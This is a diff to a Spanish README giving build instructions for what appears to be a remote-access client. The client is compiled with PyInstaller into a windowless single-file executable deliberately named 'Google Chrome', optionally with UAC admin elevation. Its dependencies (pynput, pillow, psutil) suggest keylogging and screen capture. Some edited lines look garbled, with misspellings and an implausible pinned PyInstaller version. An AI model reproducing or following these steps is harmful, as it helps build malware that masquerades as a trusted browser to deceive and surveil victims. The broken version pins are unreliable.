@@ -60,7 +60,7 @@ hash: 8f361df2687c1d5ac2c9a251ab8903cea2de914305420842b566726926903b5b
 - **¿Por que?**
     
   - Una de las razones es para no tener conflictos y no tener otras librerias al compilar.
-  - Al crearnos un nuevo entono virtual, el .exe estará cargado con las librerias instaladas en ese entorno.
+  - Al crearnos un nuevo entono virtual, el .exe estará cargado con las libriras intaladas en ese entorno.
   - El .exe / .bin pesará de **"30MB"** a **"14MB"**
     
 
@@ -84,13 +84,13 @@ Automated:
 
 Manal:
 
-- ```pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller```
+- ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6```
 
 
 # Errors:
 
 - Si tenemos errores con las librerias (module not found):
-  - ````pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller``` 
+  - ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6 pyinstaller==0.5.9``` 
 
 
 - Si tenemos el error **"pyinstaller not found"** en el *nuevo entorno*!
@@ -123,18 +123,18 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 - Tenemos varias opciones: (Accedemos a la carpeta CLIENT)
 
   ### Automatic
-    - `client>pyinstaller Compilation.spec`
+    - `client>pyinstaller compilation.spec`
 
   ### Windows:
 
   - Admin Required:
   
-      `client>pyinstaller --onefile --clean --noconsole --noupx --strip --uac-admin -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
 
   - **NO** Admin Required:
   
-      `client>pyinstaller --onefile --clean --noconsole --noupx --strip -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
 
   ### Linux:
   
-  `client>pyinstaller --onefile --clean --noconsole --noupx --strip -n "Google Chrome" conection.py`
+  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
